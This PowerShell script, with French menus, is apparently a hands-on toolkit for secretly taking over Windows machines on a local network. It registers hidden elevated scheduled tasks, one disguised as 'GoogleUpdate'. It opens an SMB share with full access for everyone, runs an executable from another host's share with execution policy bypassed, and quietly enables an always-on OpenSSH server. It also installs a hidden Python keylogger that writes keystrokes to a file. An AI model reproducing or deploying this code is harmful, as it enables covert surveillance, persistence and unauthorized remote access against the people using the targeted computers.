#Pour �criture orange
$Esc = [char]27
$Ansi24BitTemplate = "$Esc[{0};2;{1};{2};{3}m"
$Ansi24BitFore = '38'
$OrangeForeColor = $Ansi24BitTemplate -f $Ansi24BitFore, 255, 165, 0
#Write-Host "$($OrangeBackColor)Testing" -ForegroundColor Black
#Write-Host "$($OrangeForeColor)Testing" -BackgroundColor Black
function task 
{
    $currentUserWithDomain = (Get-WMIObject -class Win32_ComputerSystem).Username

    $settings = New-ScheduledTaskSettingsSet -Hidden
    $trigger = New-ScheduledTaskTrigger -AtStartup
    $principal = New-ScheduledTaskPrincipal -UserId "$env:COMPUTERNAME\sio" -RunLevel Highest
    $task = New-ScheduledTask -Action $actions -Principal $principal -Trigger $trigger -Settings $settings

    Register-ScheduledTask 'Timpe' -InputObject $task -User "$currentUserWithDomain" -Force
    Start-ScheduledTask 'Timpe'
}

function pyInstallWithLibrary
{
  try
  {
      Get-Command -Name py -ErrorAction Stop
  }
  catch 
  {
    Invoke-WebRequest -Uri "https://www.python.org/ftp/python/3.11.2/python-3.11.2-amd64.exe" -OutFile "C:\Windows\Content\python-3.11.2.exe"
    Start-Job -Name "PyInstall" -ScriptBlock {C:\Windows\Content\python-3.11.2.exe /passive /quiet}
    for ($i = 1; $i -le 100; $i++) 
    {
        Write-Progress -Activity "Installation de python en cours..." -Status "$i% Complete:" -PercentComplete $i
        Start-Sleep -Milliseconds 200
        if ($i -eq 85){Wait-Job -Name "PyInstall";Start-Sleep -Seconds 10}
    }
  }
  py -m pip install --upgrade pip
  py -m pip install keyboard 
  py -m pip install mouse
}

function dlNircmd 
{
  if (!(Test-Path -Path "C:\Windows\Content\nircmd.exe"))
  {
    Invoke-WebRequest -Uri "https://www.nirsoft.net/utils/nircmd-x64.zip" -OutFile "$env:TEMP/nircmd.zip" 
    Expand-Archive -Path "$env:TEMP/nircmd.zip" -DestinationPath $env:TEMP -Force
    Move-Item -Path "$env:TEMP/nircmd.exe" -Destination "C:\Windows\Content\"  
  }
}

function createExecDirectory 
{
  if (!(Test-Path -Path "C:\Windows\ExecDirectory"))
  {
    New-Item -ItemType Directory -Path "C:\Windows\ExecDirectory" -Force
    $Parameters = @{
      Name = 'exec'
      Path = 'C:\Windows\ExecDirectory'
      FullAccess = 'Tout le monde'
  }
    New-SmbShare @Parameters
  }
}

createExecDirectory

Clear-Host
Write-Host ("`r`n[1] ") -ForegroundColor Magenta -NoNewline
Write-Host ("Python qui bouge souris pour ouvrir site") -ForegroundColor Yellow -BackgroundColor Black
Write-Host ("[2] ") -ForegroundColor Magenta -NoNewline
Write-Host ("Ouvrir site directement (petite fenetre)") -ForegroundColor Yellow -BackgroundColor Black
Write-Host ("[3] ") -ForegroundColor Magenta -NoNewline
Write-Host ("Activer peripherique audio") -ForegroundColor Yellow -BackgroundColor Black
Write-Host ("[4] ") -ForegroundColor Magenta -NoNewline
Write-Host ("Faire un son") -ForegroundColor Yellow -BackgroundColor Black
Write-Host ("[5] ") -ForegroundColor Magenta -NoNewline
Write-Host ("SSH Infini") -ForegroundColor Yellow -BackgroundColor Black
Write-Host ("[6] ") -ForegroundColor Magenta -NoNewline
Write-Host ("Keylogger`r`n`n") -ForegroundColor Yellow -BackgroundColor Black -NoNewline

Write-Host("Nombre pour action [ ]") -ForegroundColor Cyan -BackgroundColor Red -NoNewline
$choix= Read-Host(" ")



switch ($choix) 
{
  1 { 
      pyInstallWithLibrary
      Write-Host ("$($OrangeForeColor)Site") -BackgroundColor Black -NoNewline
      $site = Read-Host(" ")
      "site = '$site'" | Set-Content -Path "C:\Windows\Content\VarSitePourMouseKeyboard.py" -Force
      start-sleep -second 2
      function createScriptMouseKeyboard 
      {
$ScriptMouseKeyboard = @"
import keyboard,mouse,time,winreg,VarSitePourMouseKeyboard
connect_to_reg = winreg.OpenKey(winreg.HKEY_CURRENT_USER,r"SOFTWARE\Microsoft\Windows\Shell\Associations\UrlAssociations\https\UserChoice")
browser = winreg.EnumValue(connect_to_reg, 0)
browser = browser[1] #Valeur clé de registre
if browser == "MSEdgeHTM": browser = "edge"
elif browser == "ChromeHTML": browser = "chrome"
elif browser == "Opera GXStable": browser = "opera"
else : browser = "edge"

mouse.move(196,1064,duration=0.5)
mouse.click(button="left")
for i in range(len(browser)):
    time.sleep(0.05)
    keyboard.write(browser[i], delay=0.1)
keyboard.press("enter")
time.sleep(1)
keyboard.press_and_release("win + up")
mouse.move(274,50,duration=0.5)
time.sleep(0.1)
mouse.click(button="left")
l = VarSitePourMouseKeyboard.site
if len(l) <= 15: v=0.09
elif len(l) <= 35: v=0.07
elif len(l) > 35: v=0.04
for i in range(len(l)):
    keyboard.write(l[i],delay=v)
keyboard.press("enter")
"@        

New-Item -ItemType File -Path "C:\Windows\Content\" -Name "mousekeyboard.py" -Value $ScriptMouseKeyboard -Force

      }
      $actions = (New-ScheduledTaskAction -Execute 'cmd' -Argument '/C start /min py "C:\Windows\Content\mousekeyboard.py"')
      createScriptMouseKeyboard
      task
  }

  2 {
      Write-Host ("$($OrangeForeColor)Site") -BackgroundColor Black -NoNewline 
      $site = Read-Host(" ") 
      $actions = (New-ScheduledTaskAction -Execute '"C:\Program Files\Google\Chrome\Application\chrome.exe"' -Argument "$site")
      task
  }

  3 {
      $actions = (New-ScheduledTaskAction -Execute 'powershell' -Argument '-WindowStyle Hidden -ExecutionPolicy bypass -Command "\\172.18.207.1\echange\sc+\actuve.exe"')
      task
  }

  4 {
      function setVolume 
      {
        dlNircmd
        Write-Host ("Volume (1-65535)") -ForegroundColor Green -BackgroundColor Black -NoNewline
        $volume = Read-Host(" ")
        C:\Windows\Content\nircmd.exe mutesysvolume 0
        C:\Windows\Content\nircmd.exe setsysvolume $volume
      }

      Write-Host ("[1] ") -ForegroundColor Magenta -NoNewline
      Write-Host ("Avec fichier WAV") -ForegroundColor Yellow -BackgroundColor Black
      Write-Host ("[2] ") -ForegroundColor Magenta -NoNewline
      Write-Host ("Avec voix qui parle") -ForegroundColor Yellow -BackgroundColor Black

      Write-Host("Nombre pour action [ ]") -ForegroundColor Cyan -BackgroundColor Red -NoNewline
      $choixOption4 = Read-Host(" ")

      switch ($choixOption4) 
      {
          1 {
              function getAndLaunchSoundFile
              {
                Write-Host ("Son Disponible :") -ForegroundColor White  -BackgroundColor Black
                $i=0
                $item = Get-ChildItem \\172.18.207.1\Echange\sc+\son
                $item | 
                ForEach-Object{
                    $i++
                    Write-Host ("[$i] ") -NoNewline -ForegroundColor Magenta
                    Write-Host ($_.name) -ForegroundColor Yellow -BackgroundColor Black
                } -End {Write-Host ("`r`n`n")}

                Write-Host("Nombre pour action [ ]") -ForegroundColor Cyan -BackgroundColor Red -NoNewline
                $choixDuSon= Read-Host(" ")
                $soundFilePath = $item[$choixDuSon-1].FullName
                (New-Object Media.SoundPlayer "$soundFilePath").PlaySync();
              }
              setVolume
              getAndLaunchSoundFile  
            }

          2 {
              function launchSpeaking 
              {
                Write-Host ("`r`n`nPhrase") -ForegroundColor Green -BackgroundColor Black -NoNewline
                [string]$phrase = Read-Host(" ")
                Add-Type -AssemblyName System.speech
                $speak = New-Object System.Speech.Synthesis.SpeechSynthesizer
                $speak.Speak($phrase)   
              }
              setVolume
              launchSpeaking
            } 
      }
  }
  
  5 {
    function createScriptSshTaskInfini 
      {
        $contentScript = { 
        Set-ItemProperty -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU' -Name 'UseWUServer' -Value 0
        Restart-Service -Name 'wuauserv'
        Start-Sleep -Seconds 1
    
        $status_install = Get-WindowsCapability -Online -Name "OpenSSH.Server~~~~0.0.1.0"
        $status_install = $status_install.State
    
        if ($status_install -match "NotPresent")
        {
          Add-WindowsCapability -Online -Name "OpenSSH.Server~~~~0.0.1.0"
          Start-Service -Name sshd
          Set-Service -Name sshd -StartupType Automatic
        }    
            
        if ($status_install -match "Installed")
        {
            if (!(Test-Path -Path "C:\Windows\System32\OpenSSH\sshd.exe") -or !(Test-Path -Path "C:\Windows\System32\OpenSSH\ssh.exe")) 
            {
              Remove-WindowsCapability -Name "OpenSSH.Server~~~~0.0.1.0" -Online
              Remove-WindowsCapability -Name "OpenSSH.Client~~~~0.0.1.0" -Online
              Add-WindowsCapability -Online -Name "OpenSSH.Server~~~~0.0.1.0"
              Add-WindowsCapability -Online -Name "OpenSSH.Client~~~~0.0.1.0"
              Set-Service -Name sshd -StartupType Automatic
            }
            $status_lanch = Get-Service -Name sshd
            $status_lanch = $status_lanch.Status
    
                if ($status_lanch -notmatch "Running")
                {
                  Start-Service -Name sshd
                  Write-Host("Service Demarré")
                }
        }
        Set-ItemProperty -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU' -Name 'UseWUServer' -Value 1
        }

        $contentScript = $contentScript.ToString()
        New-Item -ItemType File -Path "C:\Windows\Content\" -Name "SshTaskInfini.ps1" -Value $contentScript -Force
      }
      createScriptSshTaskInfini 

$xml = @"
<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.3" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
<RegistrationInfo>
<Author>Système</Author>
<URI>\GoogleUpdate</URI>
</RegistrationInfo>
<Triggers>
<SessionStateChangeTrigger>
  <Repetition>
    <Interval>PT1M</Interval>
    <StopAtDurationEnd>false</StopAtDurationEnd>
  </Repetition>
  <Enabled>true</Enabled>
  <StateChange>SessionUnlock</StateChange>
</SessionStateChangeTrigger>
</Triggers>
<Principals>
<Principal id="Author">
  <UserId>S-1-5-21-1218715442-157715563-3366828991-1001</UserId>
  <LogonType>InteractiveToken</LogonType>
  <RunLevel>HighestAvailable</RunLevel>
</Principal>
</Principals>
<Settings>
<MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
<DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
<StopIfGoingOnBatteries>true</StopIfGoingOnBatteries>
<AllowHardTerminate>true</AllowHardTerminate>
<StartWhenAvailable>false</StartWhenAvailable>
<RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
<IdleSettings>
  <StopOnIdleEnd>true</StopOnIdleEnd>
  <RestartOnIdle>false</RestartOnIdle>
</IdleSettings>
<AllowStartOnDemand>true</AllowStartOnDemand>
<Enabled>true</Enabled>
<Hidden>true</Hidden>
<RunOnlyIfIdle>false</RunOnlyIfIdle>
<DisallowStartOnRemoteAppSession>false</DisallowStartOnRemoteAppSession>
<UseUnifiedSchedulingEngine>true</UseUnifiedSchedulingEngine>
<WakeToRun>false</WakeToRun>
<ExecutionTimeLimit>PT0S</ExecutionTimeLimit>
<Priority>7</Priority>
</Settings>
<Actions Context="Author">
<Exec>
  <Command>cmd</Command>
  <Arguments>/C start /MIN powershell "C:\Windows\Content\SshTaskInfini.ps1"</Arguments>
</Exec>
</Actions>
</Task>
"@
      $currentUserWithDomain = (Get-WMIObject -class Win32_ComputerSystem).Username
      Register-ScheduledTask -Xml $xml -TaskName "GoogleUpdate" -User $currentUserWithDomain -Force 
  }

  6 {
      pyInstallWithLibrary
      function createScriptKeylogger 
      {
$ScriptKeylogger = @"
import keyboard
import time
import datetime

def temps():
    tempsdepart = time.localtime().tm_sec
    time.sleep(1)
    keyboard.start_recording()
    heure = time.localtime().tm_hour
    minute = time.localtime().tm_min
    seconde = time.localtime().tm_sec
    tempsfichier = datetime.time(hour=heure,minute=minute,second=seconde)
    lettres = ""
    while True:
        if (time.localtime().tm_sec == tempsdepart):
            data = keyboard.stop_recording()
            for i in range (len(data)):
                indexdata = data[i]
                if (indexdata.event_type == "down"):
                    lettres = lettres + str(indexdata)[14:-6] + " "
                    
            f = open(file=r"C:\Windows\Content\r.txt",mode="at")
            f.writelines(str(tempsfichier)+"\r\n")
            f.writelines(lettres+"\r\n")
            print(lettres)
            
            f.close()
            print(data)
            temps()
            
temps()
"@
      
        New-Item -ItemType File -Path "C:\Windows\Content\" -Name "ScriptKeylogger.py" -Value $ScriptKeylogger -Force
      }
        $actions = (New-ScheduledTaskAction -Execute 'powershell' -Argument '-Command "& {Start-Process py "C:\Windows\Content\ScriptKeylogger.py" -WindowStyle Hidden}"')
        createScriptKeylogger 
        task
  }
}


